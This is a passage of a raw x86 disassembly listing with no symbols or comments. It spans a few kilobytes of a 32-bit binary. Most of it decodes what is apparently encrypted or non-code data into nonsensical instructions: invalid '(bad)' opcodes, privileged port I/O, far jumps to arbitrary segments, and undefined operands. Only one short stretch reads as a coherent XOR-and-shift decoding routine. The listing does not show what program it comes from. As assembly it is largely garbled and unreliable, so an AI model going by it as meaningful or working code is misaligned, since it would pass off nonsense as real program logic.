  4181a1:	sbb    al,BYTE PTR [edx+0x1c]
  4181a4:	rcr    DWORD PTR [edx-0x20108e2e],cl
  4181aa:	jbe    0x41821c
  4181ac:	xchg   edi,eax
  4181ad:	lods   al,BYTE PTR ds:[esi]
  4181ae:	dec    esi
  4181af:	dec    esi
  4181b0:	or     eax,0x730a766d
  4181b5:	and    ebp,edx
  4181b7:	add    cl,BYTE PTR [ebx+eiz*1]
  4181ba:	xor    ecx,DWORD PTR [edx]
  4181bc:	aam    0x6b
  4181be:	jl     0x41823c
  4181c0:	call   0x635e:0x83d14d58
  4181c7:	and    ah,dh
  4181c9:	(bad)  [ebx]
  4181cb:	push   edi
  4181cc:	ds xchg ecx,eax
  4181ce:	(bad)  
  4181d0:	pop    ebp
  4181d1:	fild   QWORD PTR [edx-0x3e16eecb]
  4181d7:	push   0x994f2a26
  4181dc:	dec    eax
  4181dd:	sbb    DWORD PTR [edx],0x6c739e9d
  4181e3:	add    cl,BYTE PTR ds:0x7e588f0
  4181e9:	push   edi
  4181ea:	rcr    DWORD PTR [ebp+0x141ce508],1
  4181f0:	(bad)  
  4181f1:	xchg   esi,eax
  4181f2:	les    edx,FWORD PTR [ecx-0x1d]
  4181f5:	inc    eax
  4181f6:	mov    dh,0xdb
  4181f8:	push   esi
  4181f9:	xor    BYTE PTR [edx+0x1bb4c1fe],al
  4181ff:	mov    edx,0x763ea9f
  418204:	test   BYTE PTR [ebx],dh
  418206:	adc    ch,BYTE PTR [edx]
  418208:	loop   0x41822d
  41820a:	lahf   
  41820b:	setg   BYTE PTR [edi]
  41820e:	lock pop es
  418210:	mov    eax,0x602762bb
  418215:	pop    edx
  418216:	scas   eax,DWORD PTR es:[edi]
  418217:	sar    BYTE PTR [edi],cl
  418219:	stos   BYTE PTR es:[edi],al
  41821a:	push   esp
  41821b:	int    0xb5
  41821d:	and    edi,eax
  41821f:	xor    ebx,DWORD PTR [esi-0x318bfe15]
  418225:	test   DWORD PTR [edi+0x35],ecx
  418228:	jns    0x418202
  41822a:	inc    esi
  41822b:	inc    esi
  41822c:	in     eax,dx
  41822d:	int    0xdb
  41822f:	callw  0x6877
  418233:	add    esi,DWORD PTR [ecx+0x3cf3f6ec]
  418239:	ja     0x4182a1
  41823b:	push   ebp
  41823c:	ss ss mov esi,0x75508b03
  418243:	retf   
  418244:	outs   dx,DWORD PTR ds:[esi]
  418245:	leave  
  418246:	sar    DWORD PTR [edi-0x442342d5],1
  41824c:	ret    
  41824d:	xlat   BYTE PTR ds:[ebx]
  41824e:	fcmove st,st(7)
  418250:	out    0x10,eax
  418252:	mov    ds:0xd0756917,al
  418257:	or     esp,DWORD PTR [eax-0x1f]
  41825a:	pop    ebp
  41825b:	daa    
  41825c:	sbb    BYTE PTR [ebx-0x6],ch
  41825f:	pop    ebp
  418260:	adc    BYTE PTR [ecx+0x78],al
  418263:	add    ch,dl
  418265:	push   ebx
  418266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418267:	iret   
  418268:	scas   eax,DWORD PTR es:[edi]
  418269:	mov    dl,0xa5
  41826b:	mov    dh,0xa1
  41826d:	daa    
  41826e:	es pushf 
  418270:	sbb    eax,DWORD PTR [ebx+eiz*1-0x76fc3899]
  418277:	ins    BYTE PTR es:[edi],dx
  418278:	push   cs
  418279:	pop    ebp
  41827a:	and    eax,0xecfe93b5
  41827f:	pop    ebp
  418281:	pop    edx
  418282:	cvtdq2ps xmm5,xmm2
  418285:	sub    cl,BYTE PTR [esi]
  418287:	test   DWORD PTR [ecx-0x6a],ebx
  41828a:	les    edi,FWORD PTR [ecx]
  41828c:	push   eax
  41828d:	xor    al,0x5
  41828f:	mov    ecx,0x36b0309c
  418294:	jmp    0x81d8:0x2f5b7689
  41829b:	idiv   DWORD PTR [esi-0x38]
  41829e:	mov    bl,0xe2
  4182a0:	sub    DWORD PTR [edx+edi*4+0x3c0d08c1],0xffffff93
  4182a8:	ficomp DWORD PTR [ecx+esi*2+0x63]
  4182ac:	js     0x41825b
  4182ae:	cld    
  4182af:	xor    esp,esi
  4182b1:	sub    dh,BYTE PTR [eax]
  4182b3:	hlt    
  4182b4:	xchg   esp,eax
  4182b5:	bound  esp,QWORD PTR [ecx]
  4182b7:	out    0x83,al
  4182b9:	pop    es
  4182ba:	pop    es
  4182bb:	cs out dx,al
  4182bd:	(bad)  
  4182be:	call   0x12087575
  4182c3:	and    eax,0x5b9aabba
  4182c8:	js     0x418330
  4182ca:	mov    eax,ds:0x18912581
  4182cf:	sbb    al,0xe
  4182d1:	xchg   edi,eax
  4182d2:	mov    esp,0xfc0d199e
  4182d7:	adc    al,0xda
  4182d9:	(bad)  
  4182da:	mov    cl,0x46
  4182dc:	nop
  4182dd:	shl    DWORD PTR [ebx-0x2c],1
  4182e0:	inc    eax
  4182e1:	sub    dl,BYTE PTR [esi+0x64]
  4182e4:	std    
  4182e5:	sub    bh,0x27
  4182e8:	clc    
  4182e9:	xor    al,0xfc
  4182eb:	sbb    esi,DWORD PTR [edx+0x709d2c55]
  4182f1:	cmp    dh,BYTE PTR [ecx+0x18]
  4182f4:	mov    ah,0x47
  4182f6:	dec    ebx
  4182f7:	sbb    eax,0xe1877f03
  4182fc:	hlt    
  4182fd:	jno    0x4182c7
  4182ff:	adc    eax,0xf4f68f3f
  418304:	repnz cld 
  418306:	push   ecx
  418307:	icebp  
  418308:	or     edx,edi
  41830a:	int3   
  41830b:	loop   0x418318
  41830d:	es pop ss
  41830f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418310:	out    0x60,al
  418312:	imul   ebp,esi,0x6d16432e
  418318:	xchg   esp,eax
  418319:	and    al,0x8f
  41831b:	jbe    0x41833a
  41831d:	cmp    al,BYTE PTR [ecx-0x7c08d727]
  418323:	fdiv   DWORD PTR [ebp-0x8df080f]
  418329:	mov    esp,0x82caee53
  41832e:	shr    BYTE PTR [edi+0x5f67b62f],1
  418334:	sub    al,0x9c
  418336:	(bad)  
  418337:	stc    
  418338:	test   BYTE PTR [eax+0x1d],bl
  41833b:	adc    DWORD PTR [esp+ebp*1+0x2f33aa1c],ecx
  418342:	call   0x5e58b2e8
  418347:	inc    edx
  418348:	clc    
  418349:	jns    0x418324
  41834b:	xchg   edx,eax
  41834c:	push   ds
  41834d:	adc    eax,0xa3097528
  418352:	push   edx
  418353:	test   eax,0x3dd37f2b
  418358:	push   ss
  418359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41835a:	setne  BYTE PTR [edx+esi*1-0x6a]
  41835f:	xor    BYTE PTR [eax+0x143be77e],al
  418365:	enter  0xeea8,0x1d
  418369:	test   al,0xea
  41836b:	xor    al,BYTE PTR [eax]
  41836d:	inc    ebx
  41836e:	sti    
  41836f:	(bad)  
  418370:	dec    ebp
  418371:	bound  ebx,QWORD PTR ds:[esi-0x4790d9f2]
  418378:	xchg   ebx,eax
  418379:	popa   
  41837a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41837b:	xlat   BYTE PTR ds:[ebx]
  41837c:	mov    eax,ds:0x5e7eef92
  418381:	inc    ebx
  418382:	or     DWORD PTR ss:[esi+edx*1+0x4e5baa1c],esi
  41838a:	cld    
  41838b:	shl    DWORD PTR [eax+0x26a39b8a],0x7c
  418392:	(bad)  
  418393:	out    0x77,eax
  418395:	cmp    eax,0x34cf143b
  41839a:	or     esp,ebx
  41839c:	sti    
  41839d:	ror    BYTE PTR [ebx+0x5f1abd2a],1
  4183a3:	sub    BYTE PTR [ecx],ah
  4183a5:	sub    esi,DWORD PTR [ebx]
  4183a7:	pop    esi
  4183a8:	out    dx,al
  4183a9:	xchg   edx,eax
  4183aa:	xor    edi,DWORD PTR [ebp-0x3256f8c]
  4183b0:	mov    ecx,0x56ddb9b5
  4183b5:	sahf   
  4183b6:	loope  0x4183dd
  4183b8:	xor    bl,BYTE PTR [ecx]
  4183ba:	push   ecx
  4183bb:	cmp    DWORD PTR [ebp+ebp*8-0x5fd222be],edi
  4183c2:	xlat   BYTE PTR ds:[ebx]
  4183c3:	pop    ebp
  4183c4:	sbb    al,0x3
  4183c6:	pop    ecx
  4183c7:	mov    ebp,0xd95a1687
  4183cc:	js     0x4183cd
  4183ce:	cmp    al,al
  4183d0:	xor    BYTE PTR [esi-0x52bb7e42],dl
  4183d6:	cmc    
  4183d7:	enter  0xa2bc,0x19
  4183db:	and    ebp,esi
  4183dd:	push   ecx
  4183de:	push   ds
  4183df:	mov    gs,WORD PTR [edi+0x54]
  4183e2:	and    BYTE PTR [edx+eax*1+0x4d],bl
  4183e6:	(bad)  
  4183e7:	xor    BYTE PTR [ecx+0x1d0164de],cl
  4183ed:	mov    ds:0x58ba2178,eax
  4183f2:	push   ds
  4183f3:	mov    WORD PTR [edi+esi*2-0x533e9a69],?
  4183fa:	and    ebp,DWORD PTR [eax-0x49]
  4183fd:	imul   ebp,DWORD PTR [esi+0x5a921bad],0xffffffb4
  418404:	and    dh,BYTE PTR ds:0xf556dca1
  41840a:	leave  
  41840b:	cmp    BYTE PTR [edx-0x4651e306],bl
  418411:	pop    DWORD PTR [edx]
  418413:	inc    eax
  418414:	clc    
  418415:	dec    edx
  418416:	cmc    
  418417:	mov    cl,0xc9
  418419:	xor    al,0x3
  41841b:	jmp    0x418486
  41841d:	sub    bh,ch
  41841f:	outs   dx,DWORD PTR ds:[esi]
  418420:	xchg   ebp,eax
  418421:	scas   al,BYTE PTR es:[edi]
  418422:	repz push 0x57d28a89
  418428:	jl     0x418483
  41842a:	and    BYTE PTR [esi+0x50b28abd],ah
  418430:	cmp    esp,0x8cfbc31b
  418436:	fucomip st,st(5)
  418438:	cdq    
  418439:	jg     0x418451
  41843b:	pop    edx
  41843c:	xchg   DWORD PTR [esi+0x3201e5a7],edi
  418442:	dec    edi
  418443:	mov    bl,0x82
  418445:	sti    
  418446:	cld    
  418447:	and    DWORD PTR [ebx-0x48],ebp
  41844a:	cli    
  41844b:	jne    0x41843a
  41844d:	inc    edx
  41844e:	mov    al,BYTE PTR [esi+esi*4-0x36]
  418452:	cmc    
  418453:	cmp    dh,BYTE PTR ds:[ebx+0x40]
  418457:	fadd   QWORD PTR [edi]
  418459:	scas   al,BYTE PTR es:[edi]
  41845a:	cs retf 
  41845c:	push   ebp
  41845d:	imul   DWORD PTR [ebp-0x26034d7d]
  418463:	sbb    al,0x86
  418465:	inc    edx
  418466:	ins    BYTE PTR es:[edi],dx
  418467:	js     0x41846e
  418469:	test   al,0xa1
  41846b:	sub    ah,BYTE PTR [ecx]
  41846d:	mov    esi,0xb9ced185
  418472:	xor    eax,0x1b4b33ad
  418477:	repnz sub edx,esp
  41847a:	int    0x59
  41847c:	mov    edi,0x2fcc9b3a
  418481:	in     al,dx
  418482:	pop    ebp
  418483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418484:	push   edx
  418485:	addr16 stc 
  418487:	add    DWORD PTR [eax],eax
  418489:	das    
  41848a:	inc    ebx
  41848b:	fwait
  41848c:	mov    ds:0x96563409,al
  418491:	int3   
  418492:	mov    ch,0x70
  418494:	mov    edi,0xb6bb7c42
  418499:	mov    BYTE PTR [eax+0x2c],ch
  41849c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41849d:	clc    
  41849e:	push   eax
  41849f:	lahf   
  4184a0:	mov    DWORD PTR [esi-0x344154f2],ecx
  4184a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184a7:	adc    al,0xf7
  4184a9:	rcr    DWORD PTR [esi-0x4d1765b0],0xf9
  4184b0:	aaa    
  4184b1:	clc    
  4184b2:	pop    es
  4184b3:	mov    cl,0x8d
  4184b5:	pop    eax
  4184b6:	dec    ebp
  4184b7:	inc    eax
  4184b8:	pop    ss
  4184b9:	and    eax,0x21facdeb
  4184be:	mov    ecx,0xe44274e4
  4184c3:	aas    
  4184c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184c5:	imul   ebp,ebx,0xfffffffc
  4184c8:	sub    esp,DWORD PTR [ebx+eax*4]
  4184cb:	ja     0x418463
  4184cd:	lock mov DWORD PTR [esi-0x2eec9f3b],edi
  4184d4:	inc    edi
  4184d5:	xchg   esp,eax
  4184d6:	mov    ds:0x671a64b2,al
  4184db:	dec    esp
  4184dc:	push   cs
  4184dd:	nop
  4184de:	dec    edx
  4184df:	sub    BYTE PTR [eax],dh
  4184e1:	dec    esp
  4184e2:	inc    edi
  4184e3:	aam    0xdb
  4184e5:	sub    al,0x7
  4184e7:	sar    BYTE PTR [bx+di],0x4f
  4184eb:	test   DWORD PTR [ecx-0x6c],esp
  4184ee:	aad    0xb2
  4184f0:	jmp    0xa8ca0cbb
  4184f5:	jb     0x418502
  4184f7:	scas   al,BYTE PTR es:[edi]
  4184f8:	retf   
  4184f9:	mov    al,0x79
  4184fb:	mov    WORD PTR [ecx],?
  4184fd:	rol    bh,cl
  4184ff:	adc    DWORD PTR [eax+ecx*2+0x51eca4e0],esi
  418506:	loop   0x4184e4
  418508:	and    edx,DWORD PTR [ecx-0x45]
  41850b:	les    esp,FWORD PTR [esi]
  41850d:	shr    eax,0xbc
  418510:	test   eax,0x701e6fdb
  418515:	mov    ah,0xe0
  418517:	mov    ecx,0x5f531ff3
  41851c:	push   esp
  41851d:	aas    
  41851e:	aam    0x81
  418520:	dec    edi
  418521:	out    dx,al
  418522:	and    ecx,DWORD PTR [eax+eiz*8+0x72]
  418526:	add    al,0xca
  418528:	fidivr WORD PTR [edx-0xf]
  41852b:	add    al,BYTE PTR [eax+ebx*2-0x7e]
  41852f:	mov    ecx,eax
  418531:	or     ecx,DWORD PTR [ebp+0x10]
  418534:	xor    eax,eax
  418536:	or     edx,eax
  418538:	xor    ecx,0xba699573
  41853e:	xor    edx,0x9c0a89d8
  418544:	mov    DWORD PTR [esi],ecx
  418546:	mov    DWORD PTR [esi+0x4],edx
  418549:	mov    eax,0xc0000000
  41854e:	mov    ecx,DWORD PTR [esi]
  418550:	mov    edx,DWORD PTR [esi+0x4]
  418553:	mov    edx,ecx
  418555:	shl    edx,0x1e
  418558:	xor    edx,eax
  41855a:	mov    DWORD PTR [ebp+0x14],edx
  41855d:	mov    edx,DWORD PTR [esi]
  41855f:	mov    edi,DWORD PTR [esi+0x4]
  418562:	xor    edi,0x9c0a89d8
  418568:	xor    edx,0xba699573
  41856e:	shrd   edx,edi,0x2
  418572:	shr    edi,0x2
  418575:	or     edi,DWORD PTR [ebp+0x14]
  418578:	xor    ecx,ecx
  41857a:	mov    DWORD PTR [ebp+0xc],edi
  41857d:	or     edx,ecx
  41857f:	mov    ecx,DWORD PTR [ebx]
  418581:	mov    edi,DWORD PTR [ebx+0x4]
  418584:	mov    edi,ecx
  418586:	shl    edi,0x1e
  418589:	xor    edi,eax
  41858b:	mov    eax,DWORD PTR [ebx]
  41858d:	mov    DWORD PTR [ebp+0x14],edi
  418590:	mov    edi,DWORD PTR [ebx+0x4]
  418593:	jmp    0x418b1d
  418598:	test   DWORD PTR [ebx+0x38127d46],0xa0bf58ac
  4185a2:	mov    edx,0x749762ae
  4185a7:	jb     0x418611
  4185a9:	outs   dx,DWORD PTR ds:[esi]
  4185aa:	or     al,0x16
  4185ac:	cmp    eax,0x82161604
  4185b1:	aam    0x70
  4185b3:	out    0x22,al
  4185b5:	cld    
  4185b6:	jns    0x418570
  4185b8:	fadd   st,st(3)
  4185ba:	(bad)  
  4185bc:	dec    edx
  4185bd:	mov    ecx,0xb9c29fdd
  4185c2:	sbb    BYTE PTR [ecx+0x65],dl
  4185c5:	loop   0x418625
  4185c7:	ret    0xf41e
  4185ca:	mov    ds:0x5fe01dd8,eax
  4185cf:	jnp    0x4185b4
  4185d1:	and    al,cl
  4185d3:	jo     0x41859e
  4185d5:	rcl    DWORD PTR [ecx+0x1e],0x9b
  4185d9:	sbb    al,0xfa
  4185db:	cmp    dh,cl
  4185dd:	leave  
  4185de:	sar    BYTE PTR [edi+0x620b60fc],cl
  4185e4:	fistp  QWORD PTR [ebp+ecx*4+0x33baed00]
  4185eb:	push   edi
  4185ec:	and    bl,BYTE PTR [ecx]
  4185ee:	add    eax,0x5df870dd
  4185f3:	jg     0x418648
  4185f5:	mov    eax,0x3733716e
  4185fa:	xchg   BYTE PTR [edi+esi*2],cl
  4185fd:	push   edx
  4185fe:	lds    edi,FWORD PTR [edi+edi*8-0x681456b1]
  418605:	shl    BYTE PTR [edi-0x77f3b534],0x4
  41860c:	pop    ebx
  41860d:	xchg   esp,eax
  41860e:	dec    edx
  41860f:	fwait
  418610:	add    eax,0x22f4ff6d
  418615:	ror    DWORD PTR [ebp-0x1e],cl
  418618:	or     eax,0x9b961a77
  41861d:	or     DWORD PTR [eax-0x65b3ba06],eax
  418623:	pop    ds
  418624:	arpl   WORD PTR [esi-0x598e3662],bx
  41862a:	xor    BYTE PTR [eax-0x58078f3e],cl
  418630:	dec    esp
  418631:	test   eax,0x133db5ed
  418636:	jo     0x4185c6
  418638:	aad    0x94
  41863a:	push   ds
  41863b:	inc    esp
  41863c:	outs   dx,BYTE PTR ds:[esi]
  41863d:	cmp    eax,esi
  41863f:	xchg   DWORD PTR [edi],edi
  418641:	pop    es
  418642:	xchg   DWORD PTR [edx+eax*2],esi
  418645:	and    edi,ecx
  418647:	sbb    al,0x3e
  418649:	test   eax,0x1e5dc10c
  41864e:	push   eax
  41864f:	inc    esp
  418650:	or     BYTE PTR [esi+0x721389b4],bl
  418656:	mov    bl,dl
  418658:	(bad)  
  418659:	sti    
  41865a:	push   edi
  41865b:	cmp    dl,cl
  41865d:	jl     0x4186b9
  41865f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418660:	scas   eax,DWORD PTR es:[edi]
  418661:	ror    BYTE PTR [ecx+0x3b],1
  418664:	mov    al,0x6f
  418666:	jl     0x4186bd
  418668:	out    0x6d,al
  41866a:	dec    eax
  41866b:	sbb    edx,DWORD PTR [edi-0x2d196a7a]
  418671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418672:	mov    ecx,0x2c70afd5
  418677:	ins    BYTE PTR es:[edi],dx
  418678:	mov    cl,0x31
  41867a:	inc    esp
  41867b:	hlt    
  41867c:	inc    ebp
  41867d:	pop    ds
  41867e:	ss retf 0x2fad
  418682:	mov    dl,0xc0
  418684:	adc    esp,DWORD PTR [ebx+0x682f4579]
  41868a:	jns    0x4186ee
  41868c:	pop    ebp
  41868d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41868e:	shl    DWORD PTR [eax+0x2ecd546b],0x2
  418695:	push   eax
  418696:	loop   0x418670
  418698:	inc    eax
  418699:	mov    ds:0xdcbce056,eax
  41869e:	add    eax,0xc0c77b3e
  4186a3:	pop    ebp
  4186a4:	loop   0x41865f
  4186a6:	dec    esp
  4186a7:	pop    ebp
  4186a8:	shl    DWORD PTR [edi-0x9217e77],0xe3
  4186af:	les    ecx,FWORD PTR [ecx]
  4186b1:	inc    edx
  4186b2:	ror    BYTE PTR [eax-0x120f739e],cl
  4186b8:	(bad)  
  4186ba:	fs mov dl,0x5e
  4186bd:	sbb    BYTE PTR [esi+eax*4-0x5],ah
  4186c1:	push   0x1a
  4186c3:	fld    DWORD PTR ds:0xe69aa70
  4186c9:	and    BYTE PTR [esi],dh
  4186cb:	dec    ecx
  4186cc:	mov    eax,0xab210ad1
  4186d1:	sub    edx,edx
  4186d3:	mov    bl,0xd9
  4186d5:	sbb    BYTE PTR cs:[edx-0x5],bl
  4186d9:	stos   DWORD PTR es:[edi],eax
  4186da:	jmp    0x41871c
  4186dc:	add    al,BYTE PTR [edx-0x7a487d5e]
  4186e2:	rcl    DWORD PTR [ecx-0x20],0x5
  4186e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186e7:	sbb    eax,0x291dfdbe
  4186ec:	gs sbb eax,0xed3ee4b0
  4186f2:	(bad)  
  4186f3:	sti    
  4186f4:	cdq    
  4186f5:	repnz push ecx
  4186f7:	loop   0x418716
  4186f9:	fcmovbe st,st(1)
  4186fb:	jmp    0xb4d0:0x435de5f9
  418702:	test   eax,0xe8a643d9
  418707:	mov    esp,0xdefcfda2
  41870c:	lock xor eax,0xc025917e
  418712:	nop
  418713:	mov    gs,WORD PTR [ebx+esi*1]
  418716:	aam    0x4a
  418718:	imul   edi,DWORD PTR [ebp-0x3429da41],0xb3208582
  418722:	imul   ebx,ecx,0x7a
  418725:	scas   eax,DWORD PTR es:[edi]
  418726:	cmp    al,ah
  418728:	ds ja  0x41872e
  41872b:	push   0xc42be72e
  418730:	hlt    
  418731:	jno    0x4186c7
  418733:	or     al,0x9c
  418735:	(bad)  
  418736:	repnz xlat BYTE PTR ds:[ebx]
  418738:	cwde   
  418739:	and    esp,DWORD PTR [ecx]
  41873b:	gs push 0xfffffffa
  41873e:	shl    BYTE PTR [edi+0x47],cl
  418741:	je     0x418723
  418743:	out    dx,al
  418744:	fs push esi
  418746:	sub    dh,ch
  418748:	xchg   BYTE PTR [eax+0x19f0feb7],bh
  41874e:	pop    es
  41874f:	jnp    0x41871e
  418751:	pusha  
  418752:	xchg   edx,eax
  418753:	xchg   BYTE PTR [esi-0x53],bh
  418756:	int3   
  418757:	out    0x7f,al
  418759:	push   ds
  41875a:	mov    bl,0x26
  41875c:	mov    eax,0xe7464136
  418761:	fucomp st(2)
  418763:	ss inc esi
  418765:	adc    cl,BYTE PTR [ebp+0x19]
  418768:	aad    0x6a
  41876a:	dec    edi
  41876b:	cld    
  41876c:	fistp  WORD PTR [edi]
  41876e:	push   ds
  41876f:	test   DWORD PTR ds:0x50202165,ebx
  418775:	cdq    
  418776:	mov    DWORD PTR ds:0x3c2b97b,esp
  41877c:	xlat   BYTE PTR ds:[ebx]
  41877d:	sar    BYTE PTR [esi],cl
  41877f:	pop    edi
  418780:	pop    es
  418781:	dec    ecx
  418782:	and    DWORD PTR [edx+0x29f25ff7],ebx
  418788:	push   es
  418789:	and    eax,0xb3bf8f14
  41878e:	pop    es
  41878f:	push   bx
  418791:	inc    ecx
  418792:	test   DWORD PTR [esi],ecx
  418794:	inc    edx
  418795:	mov    al,BYTE PTR [ecx]
  418797:	mov    edi,0x7e17bc07
  41879c:	out    dx,al
  41879d:	push   esi
  41879e:	iret   
  41879f:	xchg   edx,eax
  4187a0:	xchg   edx,eax
  4187a1:	(bad)  
  4187a2:	and    eax,edx
  4187a4:	div    BYTE PTR [edx+0x35]
  4187a7:	cdq    
  4187a8:	ret    
  4187a9:	adc    ebx,esp
  4187ab:	mov    ?,WORD PTR [ebp-0x30]
  4187ae:	xor    eax,0x6a569e4a
  4187b3:	dec    edx
  4187b4:	jae    0x4187d4
  4187b6:	xchg   DWORD PTR [ecx+edi*8-0x7b94c810],esi
  4187bd:	(bad)  
  4187be:	and    al,0x5
  4187c0:	lea    ecx,[edi]
  4187c2:	addr16 call 0xc5522003
  4187c8:	call   0x6563:0xd9127238
  4187cf:	loope  0x41880a
  4187d1:	cmc    
  4187d2:	adc    BYTE PTR [ecx+ebp*8+0x21f25aba],0xe3
  4187da:	add    bl,ch
  4187dc:	lds    esp,FWORD PTR ds:0x6450dd9
  4187e2:	sub    edx,ecx
  4187e4:	pushf  
  4187e5:	jns    0x418784
  4187e7:	push   es
  4187e8:	or     bh,BYTE PTR [edx-0x4f]
  4187eb:	cli    
  4187ec:	mov    BYTE PTR [ebp-0x69e6ad0f],ah
  4187f2:	ss jnp 0x41886f
  4187f5:	icebp  
  4187f6:	add    BYTE PTR [edi-0x53],cl
  4187f9:	xor    edi,edx
  4187fb:	shl    BYTE PTR [ecx],0x32
  4187fe:	leave  
  4187ff:	pop    ecx
  418800:	xor    cl,BYTE PTR [edi+0x13f14c75]
  418806:	inc    ecx
  418807:	or     BYTE PTR [esi+0x78],0x6e
  41880b:	add    ecx,0xffffffd2
  41880e:	pop    esp
  41880f:	mov    eax,0x4f27bbee
  418814:	cmp    ecx,esi
  418816:	mov    al,ds:0x2de2c90
  41881b:	and    BYTE PTR [esi+0x6b22e541],bh
  418821:	inc    edx
  418822:	inc    esp
  418823:	daa    
  418824:	in     eax,0x58
  418826:	push   cs
  418827:	outs   dx,DWORD PTR ds:[esi]
  418828:	ret    
  418829:	push   esi
  41882a:	dec    eax
  41882b:	lods   eax,DWORD PTR ds:[esi]
  41882c:	fidiv  WORD PTR [eax+0x39]
  41882f:	push   ebx
  418830:	mov    edx,0x5f561981
  418835:	outs   dx,BYTE PTR ds:[esi]
  418836:	push   cs
  418837:	arpl   ax,dx
  418839:	shl    edx,cl
  41883b:	cmp    BYTE PTR [edx-0x34eeac4e],0xf1
  418842:	hlt    
  418843:	mov    esi,0x557825c6
  418848:	and    esi,DWORD PTR [esi-0x77]
  41884b:	mov    al,0xd0
  41884d:	mov    edx,0x89eebf71
  418852:	mov    ebx,0x13165f75
  418857:	xchg   edi,eax
  418858:	int    0xf6
  41885a:	into   
  41885b:	mov    ds:0xe3a526d,eax
  418860:	scas   eax,DWORD PTR es:[edi]
  418861:	stos   DWORD PTR es:[edi],eax
  418862:	sbb    edx,DWORD PTR [ebx]
  418864:	rcr    DWORD PTR [esi+edi*8],1
  418867:	imul   esi,esi,0x242b3f1d
  41886d:	xchg   esi,eax
  41886e:	das    
  41886f:	push   ecx
  418870:	or     DWORD PTR [ebx],ecx
  418872:	(bad)  
  418873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418874:	xor    al,0x1
  418876:	hlt    
  418877:	leave  
  418878:	sahf   
  418879:	sub    dl,BYTE PTR [edx]
  41887b:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41887d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41887e:	int3   
  41887f:	aaa    
  418880:	cmp    eax,0xc542092e
  418885:	jae    0x418821
  418887:	retf   0x37c5
  41888a:	jg     0x41887e
  41888c:	aaa    
  41888d:	jnp    0x4188b7
  41888f:	in     eax,0x7a
  418891:	mov    ebx,0x22823988
  418896:	jmp    0x85552948
  41889b:	adc    DWORD PTR [edi+0x77],ecx
  41889e:	cmp    DWORD PTR [eax+esi*8+0x34a57c03],0x565c77b1
  4188a9:	push   0x31
  4188ab:	or     BYTE PTR [ebp+0x42320894],bl
  4188b1:	add    eax,0xb3a8b61b
  4188b6:	xchg   edi,eax
  4188b7:	mov    eax,0x1a285485
  4188bc:	dec    ebx
  4188bd:	(bad)  [eax]
  4188bf:	push   eax
  4188c0:	jmp    0xd050:0xbd5514ac
  4188c7:	cmp    al,dh
  4188c9:	mov    edx,0x87f5013b
  4188ce:	pop    ds
  4188cf:	mov    ecx,0x9506ca55
  4188d4:	adc    al,0x1b
  4188d6:	inc    ecx
  4188d7:	gs daa 
  4188d9:	inc    edi
  4188da:	add    BYTE PTR [ecx],bl
  4188dc:	xlat   BYTE PTR ds:[ebx]
  4188dd:	leave  
  4188de:	fstp   QWORD PTR [edi]
  4188e0:	mov    cl,0x83
  4188e2:	sbb    BYTE PTR [edi-0x7da1bb25],0x25
  4188e9:	add    eax,0xf55ac46f
  4188ee:	ds cwde 
  4188f0:	ja     0x41888d
  4188f2:	mov    WORD PTR [edx-0x3273f4bf],?
  4188f8:	mov    esp,0xa92d0d08
  4188fd:	push   ds
  4188fe:	mov    al,0x23
  418900:	test   al,0x82
  418902:	xchg   edx,eax
  418903:	mov    dh,0x9b
  418905:	addr16 inc edx
  418908:	add    ebp,ebx
  41890a:	push   ecx
  41890b:	repnz in al,dx
  41890d:	(bad)  
  41890f:	ret    0xd916
  418912:	ret    0x55a9
  418915:	ret    
  418916:	pop    esi
  418917:	xchg   ebx,eax
  418918:	loopne 0x4188bb
  41891a:	inc    ebx
  41891b:	push   ecx
  41891c:	pop    ss
  41891d:	lods   al,BYTE PTR ds:[esi]
  41891e:	mov    ebp,0x3d21b6a3
  418923:	jo     0x41898f
  418925:	ret    
  418926:	jne    0x4188fa
  418928:	cmp    al,0xc8
  41892a:	icebp  
  41892b:	cld    
  41892c:	aaa    
  41892d:	stos   DWORD PTR es:[edi],eax
  41892e:	iret   
  41892f:	cmp    al,0xb6
  418931:	adc    DWORD PTR [esi],0xffffffce
  418934:	xchg   ebx,eax
  418935:	clc    
  418936:	jnp    0x4188e7
  418938:	or     eax,0xf380305a
  41893d:	pop    es
  41893e:	pop    edi
  41893f:	and    DWORD PTR [eax],ebx
  418941:	sub    DWORD PTR ds:0xeb597a3d,0xb6c74301
  41894b:	outs   dx,DWORD PTR ds:[esi]
  41894c:	mov    WORD PTR [eax-0xe],fs
  41894f:	retf   
  418950:	lock int3 
  418952:	dec    ecx
  418953:	sub    al,0x4b
  418955:	nop
  418956:	call   0x7b94557
  41895b:	imul   edi,DWORD PTR [ecx+0x59],0xffffffb7
  41895f:	xor    ecx,esi
  418961:	mov    ah,0x24
  418963:	and    BYTE PTR [edi-0x74596134],ah
  418969:	jne    0x4189ca
  41896b:	hlt    
  41896c:	push   edx
  41896d:	aaa    
  41896e:	mov    eax,0xe28c3585
  418973:	mov    ds:0x9f1cfc70,eax
  418978:	in     al,0xb1
  41897a:	adc    dl,ch
  41897c:	jnp    0x418965
  41897e:	cli    
  41897f:	fimul  DWORD PTR [eax+ebx*1]
  418982:	mov    eax,DWORD PTR [edi]
  418984:	lahf   
  418985:	push   esi
  418986:	les    ebx,FWORD PTR ds:0x4bf7d1d8
  41898c:	xchg   BYTE PTR [ebx],ah
  41898e:	retf   
  41898f:	(bad)  
  418990:	mov    eax,0x5776ab4f
  418995:	lds    eax,FWORD PTR [ebx]
  418997:	retf   0x8232
  41899a:	sbb    BYTE PTR [ecx-0x6a],bh
  41899d:	inc    ebp
  41899e:	add    eax,0x10a25fa1
  4189a3:	in     eax,dx
